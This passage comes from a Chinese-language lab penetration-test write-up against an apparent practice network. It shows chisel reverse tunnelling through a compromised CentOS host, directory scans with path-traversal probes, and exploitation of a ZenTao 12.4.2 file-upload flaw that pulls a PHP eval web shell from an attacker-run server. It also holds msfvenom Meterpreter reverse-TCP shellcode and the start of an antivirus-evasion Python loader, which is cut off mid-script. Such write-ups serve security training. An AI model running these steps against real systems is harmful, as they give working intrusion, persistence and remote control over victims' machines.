<div class="theme-admonition theme-admonition-warning admonition_xJq3 alert alert--warning"><div class="admonitionHeading_Gvgb"><span class="admonitionIcon_Rf37"><svg viewBox="0 0 16 16"><path fill-rule="evenodd" d="M8.893 1.5c-.183-.31-.52-.5-.887-.5s-.703.19-.886.5L.138 13.499a.98.98 0 0 0 0 1.001c.193.31.53.501.886.501h13.964c.367 0 .704-.19.877-.5a1.03 1.03 0 0 0 .01-1.002L8.893 1.5zm.133 11.497H6.987v-2.003h2.039v2.003zm0-3.004H6.987V5.987h2.039v4.006z"></path></svg></span>注意</div><div class="admonitionContent_BuS1"><p>Meterpreter 的代理能力有限，建议使用其他工具，例如 <code>chisel</code></p><div class="language-shell codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-shell codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain"># Kali</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">$ ./tools/chisel-v1.9.1/chisel_1.9.1_linux_amd64 server -p 1337 --reverse</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">2024/11/02 09:58:38 server: Reverse tunnelling enabled</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">2024/11/02 09:58:38 server: Fingerprint eJBEiCo6OqxCdKCLyYj9zH5QNuhhWwjp4iBKt0vlVeA=</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">2024/11/02 09:58:38 server: Listening on http://0.0.0.0:1337</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">2024/11/02 10:00:59 server: session#1: tun: proxy#R:10001=&gt;socks: Listening</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"># Centos</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">(remote) root@localhost.localdomain:/tmp# ./chisel_1.9.1_linux_amd64 client 192.168.200.129:1337 R:0.0.0.0:10001:socks</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">2024/11/02 10:00:58 client: Connecting to ws://192.168.200.129:1337</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">2024/11/02 10:00:58 client: Connected (Latency 1.277717ms)</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div></div></div>
<div class="language-plaintext codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-plaintext codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">[10:02:39] Starting:</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">[10:02:39] 403 -  312B  - /%2e%2e//google.com</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">[10:02:39] 301 -  149B  - /js  -&gt;  http://10.0.20.66:8080/js/</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">[10:02:40] 403 -  312B  - /.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">[10:02:51] 403 -  312B  - /\..\..\..\..\..\..\..\..\..\etc\passwd</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">[10:03:05] 200 -   55B  - /api.php</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">[10:03:10] 403 -  312B  - /cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">[10:03:15] 301 -  151B  - /data  -&gt;  http://10.0.20.66:8080/data/</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">[10:03:15] 200 -    0B  - /data/</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">[10:03:20] 200 -  114KB - /favicon.ico</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">[10:03:26] 200 -  153B  - /index.php</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">[10:03:27] 200 -  153B  - /index.pHp</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">[10:03:27] 200 -  161B  - /index.php/login/</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">[10:03:29] 200 -    0B  - /js/</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">[10:03:50] 200 -   26B  - /robots.txt</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">[10:04:01] 301 -  152B  - /theme  -&gt;  http://10.0.20.66:8080/theme/</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">[10:04:12] 200 -    2KB - /x.php</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<div class="theme-admonition theme-admonition-warning admonition_xJq3 alert alert--warning"><div class="admonitionHeading_Gvgb"><span class="admonitionIcon_Rf37"><svg viewBox="0 0 16 16"><path fill-rule="evenodd" d="M8.893 1.5c-.183-.31-.52-.5-.887-.5s-.703.19-.886.5L.138 13.499a.98.98 0 0 0 0 1.001c.193.31.53.501.886.501h13.964c.367 0 .704-.19.877-.5a1.03 1.03 0 0 0 .01-1.002L8.893 1.5zm.133 11.497H6.987v-2.003h2.039v2.003zm0-3.004H6.987V5.987h2.039v4.006z"></path></svg></span>注意</div><div class="admonitionContent_BuS1"><p>根据文件后缀大小写不敏感来看，可以初步判断是 Windows 系统</p></div></div>
<p>将 web 服务转发出来</p>
<div class="language-shell codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-shell codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">(remote) root@localhost.localdomain:/tmp# ./chisel_1.9.1_linux_amd64 client 192.168.200.129:1337 R:0.0.0.0:10002:10.0.20.66:8080 &amp;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">[2] 7389</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">2024/11/02 10:07:53 client: Connecting to ws://192.168.200.129:1337</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">2024/11/02 10:07:53 client: Connected (Latency 1.311255ms)</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>直接访问</p>
<p><img decoding="async" loading="lazy" alt="img" src="/Target-Machines-WriteUp/assets/images/image_20241108-100818-91cbc8501d3effa0b05d67dc29b7c89c.png" width="2559" height="1371" class="img_ev3q"></p>
<p>很明显是禅道框架，在登陆界面存在有测试账户，使用测试账户可以先看一下后台</p>
<p><img decoding="async" loading="lazy" alt="img" src="/Target-Machines-WriteUp/assets/images/image_20241114-101430-dbd69371775a57aa171181cd2fc3850c.png" width="2559" height="1371" class="img_ev3q"></p>
<p>得到版本信息是 专业版 <code>v12.4.2</code></p>
<p>定位到 <code>CNVD-C-2020-121325</code> 任意文件上传漏洞</p>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="win10-zentao-任意文件上传">win10 Zentao 任意文件上传<a href="#win10-zentao-任意文件上传" class="hash-link" aria-label="win10 Zentao 任意文件上传的直接链接" title="win10 Zentao 任意文件上传的直接链接">​</a></h2>
<p>首先，手动测试得到管理员账号 <code>admin/Admin123</code></p>
<p>首先，编写一个一句话传到 <code>centos</code> 上</p>
<div class="language-shell codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-shell codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">(remote) root@localhost.localdomain:/tmp# echo PD9waHAgQGV2YWwoJF9QT1NUWydzaGVsbCddKSA/Pg== | base64 -d &gt; shell.php</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">(remote) root@localhost.localdomain:/tmp# cat shell.php</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">&lt;?php @eval($_POST[&#x27;shell&#x27;]) ?&gt;</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>然后启动临时的 Python http server</p>
<div class="language-shell codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-shell codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">(remote) root@localhost.localdomain:/tmp# python -m SimpleHTTPServer 8080</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Serving HTTP on 0.0.0.0 port 8080 ...</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>计算链接参数</p>
<div class="language-shell codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-shell codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">$ echo &quot;http://10.0.20.66:8080/index.php?m=client&amp;f=download&amp;version=1&amp;link=$(echo&#x27;HTTP://10.0.20.30:8080/shell.php&#x27;| base64)&quot;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">http://10.0.20.66:8080/index.php?m=client&amp;f=download&amp;version=1&amp;link=SFRUUDovLzEwLjAuMjAuMzA6ODA4MC9zaGVsbC5waHAK</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>在禅道上触发下载</p>
<div class="language-shell codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-shell codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">http://192.168.200.129:10002/index.php?m=client&amp;f=download&amp;version=1&amp;link=SFRUUDovLzEwLjAuMjAuMzA6ODA4MC9zaGVsbC5waHA=</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p><img decoding="async" loading="lazy" alt="img" src="/Target-Machines-WriteUp/assets/images/image_20241146-104613-90de93b010f5606ca866ddc8c8d54d48.png" width="2560" height="1540" class="img_ev3q"></p>
<p>成功使用蚁剑连接</p>
<p><img decoding="async" loading="lazy" alt="img" src="/Target-Machines-WriteUp/assets/images/image_20241147-104743-718f2fc9ccbfa6762a4438a5243e9a45.png" width="1542" height="1040" class="img_ev3q"></p>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="win10-持久化">win10 持久化<a href="#win10-持久化" class="hash-link" aria-label="win10 持久化的直接链接" title="win10 持久化的直接链接">​</a></h2>
<p>尝试侦察靶机上的安全软件</p>
<p><img decoding="async" loading="lazy" alt="img" src="/Target-Machines-WriteUp/assets/images/image_20241156-105657-437fb94ba7a57e8830d0721828d9a30a.png" width="1542" height="1040" class="img_ev3q"></p>
<p>发现存在  有火绒保护</p>
<p>使用 <a href="https://github.com/Axx8/Bypass_AV" target="_blank" rel="noopener noreferrer">Axx8/Bypass_AV: Bypass_AV msf 免杀，ShellCode 免杀加载器 ，免杀 shellcode 执行程序 ，360 &amp; 火绒 &amp; Windows Defender</a> 对 msf 的马做一个免杀</p>
<p>生成一下 shellcode</p>
<div class="language-shell codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-shell codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">┌──(randark ㉿ kali)-[~]</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">└─$ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.0.20.30 LPORT=4444 --encrypt base64 -f c</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">[-] No arch selected, selecting arch: x64 from the payload</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">No encoder specified, outputting raw payload</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Payload size: 510 bytes</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Final size of c file: 2891 bytes</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">unsigned char buf[] =</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">&quot;\x2f\x45\x69\x44\x35\x50\x44\x6f\x7a\x41\x41\x41\x41\x45&quot;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">&quot;\x46\x52\x51\x56\x42\x53\x53\x44\x48\x53\x5a\x55\x69\x4c&quot;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">&quot;\x55\x6d\x42\x52\x53\x49\x74\x53\x47\x45\x69\x4c\x55\x69&quot;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">&quot;\x42\x57\x54\x54\x48\x4a\x53\x41\x2b\x33\x53\x6b\x70\x49&quot;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">&quot;\x69\x33\x4a\x51\x53\x44\x48\x41\x72\x44\x78\x68\x66\x41&quot;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">&quot;\x49\x73\x49\x45\x48\x42\x79\x51\x31\x42\x41\x63\x48\x69&quot;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">&quot;\x37\x56\x4a\x42\x55\x55\x69\x4c\x55\x69\x43\x4c\x51\x6a&quot;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">&quot;\x78\x49\x41\x64\x42\x6d\x67\x58\x67\x59\x43\x77\x49\x50&quot;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">&quot;\x68\x58\x49\x41\x41\x41\x43\x4c\x67\x49\x67\x41\x41\x41&quot;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">&quot;\x42\x49\x68\x63\x42\x30\x5a\x30\x67\x42\x30\x45\x53\x4c&quot;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">&quot;\x51\x43\x43\x4c\x53\x42\x68\x4a\x41\x64\x42\x51\x34\x31&quot;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">&quot;\x5a\x4e\x4d\x63\x6c\x49\x2f\x38\x6c\x42\x69\x7a\x53\x49&quot;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">&quot;\x53\x41\x48\x57\x53\x44\x48\x41\x51\x63\x48\x4a\x44\x61&quot;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">&quot;\x78\x42\x41\x63\x45\x34\x34\x48\x58\x78\x54\x41\x4e\x4d&quot;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">&quot;\x4a\x41\x68\x46\x4f\x64\x46\x31\x32\x46\x68\x45\x69\x30&quot;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">&quot;\x41\x6b\x53\x51\x48\x51\x5a\x6b\x47\x4c\x44\x45\x68\x45&quot;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">&quot;\x69\x30\x41\x63\x53\x51\x48\x51\x51\x59\x73\x45\x69\x45&quot;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">&quot;\x46\x59\x51\x56\x68\x65\x57\x55\x67\x42\x30\x46\x70\x42&quot;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">&quot;\x57\x45\x46\x5a\x51\x56\x70\x49\x67\x2b\x77\x67\x51\x56&quot;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">&quot;\x4c\x2f\x34\x46\x68\x42\x57\x56\x70\x49\x69\x78\x4c\x70&quot;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">&quot;\x53\x2f\x2f\x2f\x2f\x31\x31\x4a\x76\x6e\x64\x7a\x4d\x6c&quot;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">&quot;\x38\x7a\x4d\x67\x41\x41\x51\x56\x5a\x4a\x69\x65\x5a\x49&quot;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">&quot;\x67\x65\x79\x67\x41\x51\x41\x41\x53\x59\x6e\x6c\x53\x62&quot;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">&quot;\x77\x43\x41\x42\x46\x63\x43\x67\x41\x55\x48\x6b\x46\x55&quot;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">&quot;\x53\x59\x6e\x6b\x54\x49\x6e\x78\x51\x62\x70\x4d\x64\x79&quot;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">&quot;\x59\x48\x2f\x39\x56\x4d\x69\x65\x70\x6f\x41\x51\x45\x41&quot;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">&quot;\x41\x46\x6c\x42\x75\x69\x6d\x41\x61\x77\x44\x2f\x31\x57&quot;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">&quot;\x6f\x4b\x51\x56\x35\x51\x55\x45\x30\x78\x79\x55\x30\x78&quot;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">&quot;\x77\x45\x6a\x2f\x77\x45\x69\x4a\x77\x6b\x6a\x2f\x77\x45&quot;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">&quot;\x69\x4a\x77\x55\x47\x36\x36\x67\x2f\x66\x34\x50\x2f\x56&quot;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">&quot;\x53\x49\x6e\x48\x61\x68\x42\x42\x57\x45\x79\x4a\x34\x6b&quot;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">&quot;\x69\x4a\x2b\x55\x47\x36\x6d\x61\x56\x30\x59\x66\x2f\x56&quot;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">&quot;\x68\x63\x42\x30\x43\x6b\x6e\x2f\x7a\x6e\x58\x6c\x36\x4a&quot;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">&quot;\x4d\x41\x41\x41\x42\x49\x67\x2b\x77\x51\x53\x49\x6e\x69&quot;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">&quot;\x54\x54\x48\x4a\x61\x67\x52\x42\x57\x45\x69\x4a\x2b\x55&quot;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">&quot;\x47\x36\x41\x74\x6e\x49\x58\x2f\x2f\x56\x67\x2f\x67\x41&quot;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">&quot;\x66\x6c\x56\x49\x67\x38\x51\x67\x58\x6f\x6e\x32\x61\x6b&quot;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">&quot;\x42\x42\x57\x57\x67\x41\x45\x41\x41\x41\x51\x56\x68\x49&quot;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">&quot;\x69\x66\x4a\x49\x4d\x63\x6c\x42\x75\x6c\x69\x6b\x55\x2b&quot;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">&quot;\x58\x2f\x31\x55\x69\x4a\x77\x30\x6d\x4a\x78\x30\x30\x78&quot;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">&quot;\x79\x55\x6d\x4a\x38\x45\x69\x4a\x32\x6b\x69\x4a\x2b\x55&quot;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">&quot;\x47\x36\x41\x74\x6e\x49\x58\x2f\x2f\x56\x67\x2f\x67\x41&quot;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">&quot;\x66\x53\x68\x59\x51\x56\x64\x5a\x61\x41\x42\x41\x41\x41&quot;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">&quot;\x42\x42\x57\x47\x6f\x41\x57\x6b\x47\x36\x43\x79\x38\x50&quot;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">&quot;\x4d\x50\x2f\x56\x56\x31\x6c\x42\x75\x6e\x56\x75\x54\x57&quot;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">&quot;\x48\x2f\x31\x55\x6e\x2f\x7a\x75\x6b\x38\x2f\x2f\x2f\x2f&quot;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">&quot;\x53\x41\x48\x44\x53\x43\x6e\x47\x53\x49\x58\x32\x64\x62&quot;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">&quot;\x52\x42\x2f\x2b\x64\x59\x61\x67\x42\x5a\x53\x63\x66\x43&quot;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">&quot;\x38\x4c\x57\x69\x56\x76\x2f\x56&quot;;</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>然后将 shellcode 加载进 python 脚本</p>
<div class="language-python codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-python codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token keyword" style="color:#00009f">import</span><span class="token plain"> base64</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token keyword" style="color:#00009f">import</span><span class="token plain"> random</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token keyword" style="color:#00009f">import</span><span class="token plain"> ctypes</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token keyword" style="color:#00009f">def</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">decode</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">shell_code</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain">keys</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    shell_code_base64 </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&#x27;&#x27;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    random</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">seed</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">keys</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    code </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> shell_code</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">split</span><span class="token punctuation" style="color:#393A34">(</span><span class="token string" style="color:#e3116c">&#x27;,&#x27;</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token keyword" style="color:#00009f">for</span><span class="token plain"> item </span><span class="token keyword" style="color:#00009f">in</span><span class="token plain"> code</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        item </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token builtin">int</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">item</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        shell_code_base64 </span><span class="token operator" style="color:#393A34">+=</span><span class="token plain"> </span><span class="token builtin">chr</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">item </span><span class="token operator" style="color:#393A34">^</span><span class="token plain"> random</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">randint</span><span class="token punctuation" style="color:#393A34">(</span><span class="token number" style="color:#36acaa">0</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">255</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token keyword" style="color:#00009f">return</span><span class="token plain"> shell_code_base64</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token keyword" style="color:#00009f">def</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">fs_decode</span><span class="token punctuation" 